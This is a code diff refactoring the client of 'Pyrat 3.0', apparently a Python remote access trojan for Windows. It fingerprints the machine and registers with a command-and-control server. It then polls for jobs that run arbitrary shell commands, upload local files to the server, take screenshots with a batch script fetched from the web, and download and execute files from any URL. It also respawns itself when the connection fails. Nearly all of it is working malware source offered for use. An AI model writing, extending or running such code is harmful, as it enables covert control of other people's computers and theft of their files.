@@ -8,248 +8,370 @@ import requests
 import subprocess
 import tkinter as tk
 from uuid import getnode
-from tkinter import messagebox
 from ast import literal_eval
+from tkinter import messagebox
 from time import gmtime, strftime, sleep
 
-
-HOME_HOST = "http://127.0.0.1:8000/pyrat3_server/api/"
+HOME = "http://127.0.0.1:8000/pyrat3_server/api/"
 
 
 def curr_datetime():
-    return strftime('%Y-%m-%d %H:%M:%S', gmtime())
+    return strftime("%Y-%m-%d %H:%M:%S", gmtime())
 
 
 class Client:
+
+    """
+    Create object with gathered about local machine informations.
+    Object is also responsible for communication with server.
+    """
+
     def __init__(self):
-        # Code for detecting mac found on https://stackoverflow.com/questions/159137/getting-mac-address
-        self.det_mac = ''.join(
-            ('%012X' % getnode())[i: i + 2] for i in range(0, 12, 2)
+        # Code for gain MAC-adress found on Stackoverflow
+        # https://stackoverflow.com/questions/159137/getting-mac-address
+        self.det_mac = "".join(
+            ("%012X" % getnode())[i : i + 2] for i in range(0, 12, 2)
         )
         self.det_os = platform.system() + platform.release()
-        self.det_name = os.environ['COMPUTERNAME']
+        self.det_name = os.environ["COMPUTERNAME"]
         self.det_int_ip = socket.gethostbyname(socket.gethostname())
-        self.det_ext_ip = requests.get('https://api.ipify.org').text
+        self.det_ext_ip = requests.get("https://api.ipify.org").text
         self.country = self._get_country()
-        self.pc_uuid = subprocess.check_output(
-            'wmic csproduct get UUID',
-            shell=True,
-            universal_newlines=True,
-            stderr=subprocess.PIPE
-        ).replace(' ', '').replace('\r', '').replace('\n', '').replace('UUID', '')
+        # Due to limitation in imported modules, replace used instead regex module
+        self.pc_uuid = (
+            subprocess.check_output(
+                "wmic csproduct get UUID",
+                shell=True,
+                universal_newlines=True,
+                stderr=subprocess.PIPE,
+            )
+            .replace(" ", "")
+            .replace("\r", "")
+            .replace("\n", "")
+            .replace("UUID", "")
+        )
+        # Codepage is necessary to parse command output in proper way
+        self.codepage = "cp{}".format(
+            "".join(
+                [
+                    s
+                    for s in subprocess.check_output("chcp", shell=True).decode("utf-8")
+                    if s.isdigit()
+                ]
+            )
+        )
+        # Data used to identify client in server
         self.user_data = {
-            'pc_uuid': self.pc_uuid,
-            'mac': self.det_mac,
-            'os': self.det_os,
-            'name': self.det_name,
-            'int_ip': self.det_int_ip,
-            'ext_ip': self.det_ext_ip,
-            'country': self.country,
+            "pc_uuid": self.pc_uuid,
+            "mac": self.det_mac,
+            "os": self.det_os,
+            "name": self.det_name,
+            "int_ip": self.det_int_ip,
+            "ext_ip": self.det_ext_ip,
+            "country": self.country,
         }
 
         self.headers = requests.utils.default_headers().update(
-            {
-                'User-Agent': 'Pyrat Client 3.0',
-            },
+            {"User-Agent": "Pyrat Client 3.0"}
         )
+        # client_id to be set after registration or validation as know client
         self.client_id = None
 
-        self.home_host = None
-        self.home_host_files = None
+    @property
+    def client_home(self):
+        return f"{HOME}{self.client_id}/"
+
+    @property
+    def client_home_files(self):
+        return f"{HOME}{self.client_id}/upload/"
 
     def _get_country(self):
 
-        country = requests.get(f'http://ip-api.com/json/{self.det_ext_ip}?fields=status,message,countryCode').json()
-        if country['status'] == 'success':
-            return country['countryCode']
+        country = requests.get(
+            f"http://ip-api.com/json/{self.det_ext_ip}?fields=status,message,countryCode"
+        ).json()
+        if country["status"] == "success":
+            return country["countryCode"]
         else:
-            return '??'
-
-    def send_data(self, data, *args):
-
-        # get system CP (default for PL: 852, and set variable here)
-
-        if args and args[0]:
-            say_catch_file = requests.post(
-                self.home_host_files,
-                data=data,
-                headers=self.headers,
-                files=args[0],
-            )
-            say_catch = requests.patch(
-                self.home_host,
-                json=data,
-                headers=self.headers
-            )
-            return say_catch.json()
-        else:
-            say_catch = requests.patch(
-                self.home_host,
-                json=data,
-                headers=self.headers
-            )
-            return say_catch.json()
-
-    def get_data(self):
-
-        say_give = requests.get(
-            self.home_host,
-            headers=self.headers,
-        )
-        return say_give.json()
+            return "??"
 
     def register_at_db(self):
 
-        get_status = requests.post(HOME_HOST, json=self.user_data)
-        print(get_status.json())
-        status_message = get_status.json()['message']
-        self.client_id = get_status.json()['client_id']
-        self.home_host = f'{HOME_HOST}{self.client_id}/'
-        self.home_host_files = f'{HOME_HOST}{self.client_id}/upload/'
+        get_status = requests.post(HOME, json=self.user_data)
+        status_message = get_status.json()["message"]
+        self.client_id = get_status.json()["client_id"]
         status_code = get_status.status_code
-        print(self.client_id)
-        print(self.home_host)
-        print(self.home_host_files)
-        print(status_code, status_message)
+        print(f'Client ID: {self.client_id}')
+        print(f'Client status: {status_message} ({status_code})')
         if status_code == 400:
-            # Add raise
-            print('Unable to register client!')
-            exit()
+            raise RuntimeError("Unable to register client")
+
+    def send_data(self, data, *args):
+
+        """
+        Function used to send data to server. Necessary is to specify data to be send.
+        In one function call is possible,  to make two requests: one for a text-data (dict)
+        and second for object via POST multipart/form-data form.
+        :param data: Data delivered to server; for REST-API communication, it should be a dict.
+        Obligatory parameter.
+        :param args: Only args[0] will be considered. Reserved for file uploading to server.
+        It should be object (for example image).
+        :return: Response from server in JSON format.
+        """
+
+        if args and args[0]:
+            say_catch_file = requests.post(
+                self.client_home_files, data=data, headers=self.headers, files=args[0]
+            )
+        say_catch = requests.patch(self.client_home, json=data, headers=self.headers)
+        return say_catch.json()
+
+    def get_data(self):
+
+        """
+        Function fetching data from server - only for client called within instance.
+        :return: Response from server in JSON format.
+        """
+
+        say_give = requests.get(self.client_home, headers=self.headers)
+        return say_give.json()
 
 
 class Command:
 
-    @staticmethod
-    def popup(title, text):
+    """
+    Each function should return data contains specify values: job_id and current date and time.
+    It's important on server side to specify current status of client (WORKING, IDDLE, OFFLINE).
+    Returned object must be a dict with {'confirmation': value} pair (where value is a string)
+    """
+
+    def __init__(self, client, job_id):
+        self.client = client
+        self.job_id = job_id
+
+    # Dekorator, zeby zwracany wynik byl zawsze w takiej samej formie
+
+    def popup(self, title, text):
+
+        """
+        Display a message for user.
+        :param title: Window title.
+        :param text:  Window text.
+        :return: Dict with result as string
+        """
+
         r_window = tk.Tk()
         r_window.withdraw()
+        # Destroy window (after scheduled time) if there is no reaction from user side
         r_window.after(30000, r_window.destroy)
         if messagebox.showinfo(text, title):
             r_window.destroy()
-        confirmation = f'[SUCESS] ({curr_datetime()}) \nMessagebox showed'
-        return {'confirmation': confirmation}
+        confirmation = (
+            f"[{self.job_id}] [SUCESS] ({curr_datetime()}) \nMessagebox showed"
+        )
+        return {"confirmation": confirmation}
 
-    @staticmethod
-    def run_command(terminal, **kwargs):
+    def run_command(self, terminal, **kwargs):
+
+        """
+        Run command on terminal or directly.
+        :param terminal: Boolean value (True or False).
+        :param kwargs: Dict with main command and additional parameters.
+        :return: Dict with result as string.
+
+        Each arg is attached to list (because subprocess can be called with list or string as command).
+        If terminal == True, command is called via subprocess.check_output (to get command output as string).
+        Each output from cmd.exe must be decoded according to system codepage to keep all standard characters
+        and whitespace characters.
+        If command is called directly (terminal == False), subprocess.Popen is used. There is no output
+        from called command.
+        For both methods, exception will be cached, if command or executable file is not recognized/not exists.
+        """
+
         if kwargs:
-            codepage_str = str(subprocess.check_output('chcp', shell=True, stderr=subprocess.PIPE))
-            codepage = 'cp{}'.format(''.join([s for s in list(codepage_str) if s.isdigit()]))
             arg_list = []
+            # Add each arg to list
             for key, value in kwargs.items():
                 arg_list.append(value)
-            if terminal:
+            if terminal is True:
                 try:
-                    output = subprocess.check_output(arg_list, shell=True, stderr=subprocess.PIPE).decode(codepage)
-                    confirmation = f'[SUCCESS] ({curr_datetime()}]) \n{output}'
+                    output = subprocess.check_output(
+                        arg_list, shell=True, stderr=subprocess.PIPE
+                    ).decode(self.client.codepage)
+                    confirmation = (
+                        f"[{self.job_id}] [SUCCESS] ({curr_datetime()}) \n{output}"
+                    )
                 except subprocess.CalledProcessError:
-                    confirmation = f'[FAILED] ({curr_datetime()}) unknown command'
+                    confirmation = (
+                        f"[{self.job_id}] [FAILED] ({curr_datetime()}) Unknown command"
+                    )
             else:
                 try:
-                    output = subprocess.Popen(arg_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                    confirmation = f'[SUCCESS] ({curr_datetime()}) \n{arg_list[0]} executed'
+                    subprocess.Popen(
+                        arg_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+                    )
+                    confirmation = f"[{self.job_id}] [SUCCESS] ({curr_datetime()}) \n{arg_list[0]} executed"
                 except FileNotFoundError as e:
                     print(e)
-                    confirmation = f'[FAILED] ({curr_datetime()}) executable file not found'
-            return {'confirmation': confirmation}
+                    confirmation = f"[{self.job_id}] [FAILED] ({curr_datetime()}) Executable file not found"
+            return {"confirmation": confirmation}
         else:
-            confirmation = f'[FAILED] ({curr_datetime()})'
-            return {'confirmation': confirmation}
+            confirmation = f"[{self.job_id}] [FAILED] ({curr_datetime()})"
+            return {"confirmation": confirmation}
 
-    @staticmethod
-    def file_upload(file_path):
+    def file_upload(self, file_path):
+
+        """
+        Upload local file to server.
+        :param File_path: Path to requested local file (file, which should be uploaded to server).
+        :return: Dict with result as string and requested file-object
+
+        Result of function is depending of file existing. If  file exists, there is a dict with result
+        as string, and a file-object returned. If fail, only dict with result is returned.
+        """
+
         try:
             if os.path.isfile(file_path):
-                file = {
-                    'file': open(file_path, 'rb')
-                }
-                # say_file = s.post(home_host + '/upload/', files=file, data=payload)
-                confirmation = f'[SUCCESS] ({curr_datetime()}) \nFile {file_path} uploaded'
-                return {'confirmation': confirmation, 'file': file}
+                file = {"file": open(file_path, "rb")}
+                confirmation = f"[{self.job_id}] [SUCCESS] ({curr_datetime()}) \nFile {file_path} uploaded"
+                return {"confirmation": confirmation, "file": file}
             else:
-                confirmation = f'[ERROR] ({curr_datetime()}) \nFile {file_path} not exists'
-                return {'confirmation': confirmation}
+                confirmation = f"[{self.job_id}] [ERROR] ({curr_datetime()}) \nFile {file_path} not exists"
+                return {"confirmation": confirmation}
+        # Catch exception if there is problem with file-read (system file, currently in use etc)
         except IOError:
-            confirmation = f'[ERROR] ({curr_datetime()}) \nProblem with access to file {file_path}'
-            return {'confirmation': confirmation}
+            confirmation = f"[{self.job_id}] [ERROR] ({curr_datetime()}) \nProblem with access to file {file_path}"
+            return {"confirmation": confirmation}
 
-    @staticmethod
-    def screenshot():
-        temp_dir = os.path.expanduser('~') + '\\AppData\\Local\\Temp\\'
-        bat_url = 'https://raw.githubusercontent.com/npocmaka/batch.scripts/master/hybrids/.net/c/screenCapture.bat'
-        # print(app_dir)
+    # Fake **kwargs to allow run function with empty kwargs (dict)
+    def screenshot(self, **kwargs):
+
+        """
+        Make screenshot and upload it to server.
+        :param kwargs: Fake args, to unify way of calling methods in main() function.
+        :return: Dict with result as string and image object.
+
+        To reduce of using external Python modules, screen is captured using self-compilling C# file.
+        Great tool was provided by Vasil Arnaudov (https://github.com/npocmaka).
+        If screen capturing (called using another method within instance) is successful, dictionary with
+        result and file-object wil be returned. Else only dict with result will be returned.
+        """
+
+        # Get temp dir for current user
+        temp_dir = os.path.expanduser("~") + "\\AppData\\Local\\Temp\\"
+        bat_url = "https://raw.githubusercontent.com/npocmaka/batch.scripts/master/hybrids/.net/c/screenCapture.bat"
         r = requests.get(bat_url)
-        with open(f'{temp_dir}screenCapture.bat', 'w') as f:
+        with open(f"{temp_dir}screenCapture.bat", "w") as f:
+            # Save file source as text
             f.write(r.text)
-        screen_name = '%s.jpg' % (strftime('%Y-%m-%d_%H_%M_%S', gmtime()))
-        # print(screen_name)
+        # Replace all characters, which could generate problems
+        screen_name = "%s.jpg" % (curr_datetime().replace(' ', '_').replace(':', '_'))
         args_dict = {
-            'arg0': 'cd',
-            'arg1': temp_dir,
-            'arg2': '&&',
-            'arg3': 'screenCapture.bat',
-            'arg4': screen_name
+            "arg0": "cd",
+            "arg1": temp_dir,
+            "arg2": "&&",
+            "arg3": "screenCapture.bat",
+            "arg4": screen_name,
         }
-        make_screenshot = Command.run_command(terminal=True, **args_dict)
-        file = {
-            'file': open(temp_dir + screen_name, 'rb')
-        }
-        confirmation = f'[SUCCESS] ({curr_datetime()}) Screeenshot {screen_name}  was made & uploaded'
-        if 'SUCCESS' in make_screenshot['confirmation']:
-            return {'confirmation': confirmation, 'file': file}
+        # Call another method within instance
+        make_screenshot = self.run_command(terminal=True, **args_dict)
+        file = {"file": open(temp_dir + screen_name, "rb")}
+        confirmation = f"[{self.job_id}] [SUCCESS] ({curr_datetime()}) Screenshot {screen_name}  was made & uploaded"
+        if "SUCCESS" in make_screenshot["confirmation"]:
+            return {"confirmation": confirmation, "file": file}
         else:
-            confirmation = f'[ERROR] ({curr_datetime()}) Screeenshot {screen_name}  was not made'
-            return {'confirmation': confirmation}
+            confirmation = f"[{self.job_id}] [ERROR] ({curr_datetime()}) Screenshot {screen_name}  was not made"
+            return {"confirmation": confirmation}
 
-    @staticmethod
-    def file_download(url, d_path, execute):
-        d_file_name = url.split('/')[-1]
+    def file_download(self, url, save_path, execute):
+
+        """
+        Download file to local machine, and run if requested.
+        :param url: URL of requested (to be downloaded) file.
+        :param save_path: Path for save requested file on local machine
+        :param execute: Boolean value (True or False).
+        :return: Dict with result as string.
+
+        Get binary object and save it to local machine. Execute downloaded file if 'execute' == True.
+        Return dictionary with result. Catch exception and return information when failure.
+        """
+        print('Execute')
+        print(execute)
+        file_name = url.split("/")[-1]
+        # Download file as binary object
         file = requests.get(url, stream=True)
         try:
-            d_file_path = f'{d_path}\\{d_file_name}'
-            with open(d_file_path, 'wb') as f:
+            file_path = f"{save_path}\\{file_name}"
+            with open(file_path, "wb") as f:
+                # Save file as binary object
                 shutil.copyfileobj(file.raw, f)
-            if execute:
-                args_dict = {
-                    'terminal': 0,
-                    'args0': d_file_path,
-                }
-                text = Command.run_command(**args_dict)
-                print(text)
-                confirmation = f'[SUCESS] ({curr_datetime()}) File {url} downloaded, executed'
-                return {'confirmation': confirmation}
+            if execute is True:
+                args_dict = {"terminal": False, "args0": file_path}
+                # Call another method within instance
+                self.run_command(**args_dict)
+                confirmation = f"[{self.job_id}] [SUCESS] ({curr_datetime()}) File {url} downloaded, executed"
+                return {"confirmation": confirmation}
             else:
-                confirmation = f'[SUCESS] ({curr_datetime()}) File {url} downloaded, not executed'
-                return {'confirmation': confirmation}
+                confirmation = f"[{self.job_id}] [SUCESS] ({curr_datetime()}) File {url} downloaded, not executed"
+                return {"confirmation": confirmation}
+        # Catch exception if there is problem with access to requested location for file save
         except IOError as e:
             print(e)
-            confirmation = f'[ERROR] ({curr_datetime()}) File {url} not downloaded'
-            return {'confirmation': confirmation}
+            confirmation = f"[{self.job_id}] [ERROR] ({curr_datetime()}) File {url} not downloaded and/or not executed"
+            return {"confirmation": confirmation}
 
 
 def main():
+
+    """
+    Main function for managing jobs.
+    :return: None
+
+    First, create object and get script path (for further re-runs of script).
+    Next, try to connect to server and after success, create necessary lists for job_id
+    management.
+    Go to loop and check that there is something to do.
+    """
 
     client = Client()
     script_path = os.path.abspath(__file__)
 
     def connect_or_kill(try_count):
 
+        """
+        Connect to a server.
+        :param try_count: Integer; how many repeats script should perform after self-termination
+        :return: None
+
+        Calling a function within instance and if expected data will be returned, break the loop.
+        If try_count == 0, execute another instance and kill existing.
+        """
+
+        print(
+            """\
+         ______   __  __     ______     ______     ______
+        /\  == \ /\ \_\ \   /\  == \   /\  __ \   /\__  _\\
+        \ \  _-/ \ \____ \  \ \  __<   \ \  __ \  \/_/\ \/
+         \ \_\    \/\_____\  \ \_\ \_\  \ \_\ \_\    \ \_\\
+          \/_/     \/_____/   \/_/ /_/   \/_/\/_/     \/_/
+        """
+        )
+
         messages = {
             "attempt": "CLIENT REGISTRATION: TRY TO CONNECT TO CC, ATTEMPT",
-            "fail": "CLIENT REGISTRATION: UNABLE TO CONNECT, PAUSE FOR 10 SECONDS",
+            "fail": "CLIENT REGISTRATION: UNABLE TO CONNECT, PAUSE FOR 5 SECONDS",
             "kill": "CLIENT REGISTRATION: UNABLE TO CONNECT, KILLING CURRENT INSTANCE",
         }
 
         max_count = try_count
 
-        attempt = messages['attempt']
-        fail = messages['fail']
-        kill = messages['kill']
+        attempt = messages["attempt"]
+        fail = messages["fail"]
+        kill = messages["kill"]
 
         while try_count:
             try:
-                print(
-                    f'++++ {attempt} {max_count-try_count+1} OF {max_count} ++++'
-                )
+                print(f"++++ {attempt} {max_count - try_count + 1} OF {max_count} ++++")
                 client.register_at_db()
                 break
             except Exception as e:
@@ -257,65 +379,63 @@ def main():
                 try_count -= 1
                 if not try_count:
                     subprocess.Popen(["python", script_path])
-                    print(f'++++ {kill} ++++')
+                    print(f"++++ {kill} ++++")
                     raise SystemExit
                 else:
-                    print(f'++++ {fail} ++++')
-                    #print(e)
+                    print(f"++++ {fail} ++++")
+                    # print(e)
                     sleep(5)
 
     connect_or_kill(4)
-    command = Command()
     received_job_id = []
     sent_job_id = []
-
-    com_dict = {
-        'popup': command.popup,
-        'run_command': command.run_command,
-        'file_download': command.file_download,
-        'screenshot': command.screenshot,
-        'file_upload': command.file_upload,
-    }
 
     iter_counter = 1
 
     while True:
-        print('++++ NEW ITERATION, PRINTING LISTS ++++')
-        print(f'Received jobs (basing on job_id\'s): {received_job_id}')
-        print(f'Sent jobs (basing on job_id\'s): {sent_job_id}')
-        get_job = client.get_data()
-        #print(get_job)
-        job = get_job.get('job')
-        # convert string to bool if key is 'terminal' or 'execute'
-        job_args = {k: literal_eval(v) if ('terminal' or 'execute') in k else v
-                    for k, v in literal_eval(get_job.get('job_args')).items()}
-        #print(job_args)
-        job_id = get_job['job_id']
-        if any(i in job for i in com_dict):
-            if job_id not in (received_job_id and sent_job_id):
-                # Do something
-                com_to_run = com_dict[job]
-                if job_args:
-                    job_result = com_to_run(**job_args)
-                else:
-                    job_result = com_to_run()
+        print("++++ NEW ITERATION: PRINTING LISTS ++++")
+        print(f"Received jobs (basing on job_id's): {received_job_id}")
+        print(f"Sent jobs (basing on job_id's): {sent_job_id}")
+        # Fetch data for already registered client
+        try:
+            get_job = client.get_data()
+        except Exception as e:
+            subprocess.Popen(["python", script_path])
+            print(f"++++ NEW ITERATION: UNABLE TO CONNECT, KILLING CURRENT INSTANCE ++++")
+            raise SystemExit
+        job = get_job.get("job")
+        # Convert string to bool if key is 'terminal' or 'execute'
+        job_args = {
+            k: literal_eval(v) if ("terminal" or "execute") in k else v
+            for k, v in literal_eval(get_job.get("job_args")).items()
+        }
+        job_id = get_job["job_id"]
+        # If job is not yet executed, try to run it
+        if job_id not in (received_job_id and sent_job_id):
+            try:
+                # Create object
+                command = Command(client, job_id)
+                # Search for method in object
+                com_to_run = getattr(command, job)
+                # Run job
+                job_result = com_to_run(**job_args)
+                # Add job_id to list of received jobs
                 received_job_id.append(job_id)
-                job_results = {
-                    'job_result': '[{}] {}'.format(job_id, job_result.get('confirmation')),
-                }
-                client.send_data(job_results, job_result.get('file', None))
+                client.send_data(
+                    {"job_result": job_result.get("confirmation")},
+                    job_result.get("file", None),
+                )
+                # Add job_id to lists of jobs already performed and reported to server
                 sent_job_id.append(job_id)
-            else:
-                job_results = {
-                    'last_activity_datetime': strftime('%Y-%m-%d %H:%M:%S', gmtime()),
-                }
-                client.send_data(job_results)
-        else:
-            job_results = {
-                'last_activity_datetime': strftime('%Y-%m-%d %H:%M:%S', gmtime()),
-            }
-            client.send_data(job_results)
-        print(f'++++ END OF ITERATION #{iter_counter} ++++')
+            # If job is not available in object (there is no method to call), skip
+            except AttributeError:
+                pass
+        # Send information to server, that instance is alive
+        ping = {
+            "last_activity_datetime": strftime("%Y-%m-%d %H:%M:%S", gmtime())
+        }
+        client.send_data(ping)
+        print(f"++++ END OF ITERATION #{iter_counter} ++++")
         iter_counter += 1
         sleep(5)
 
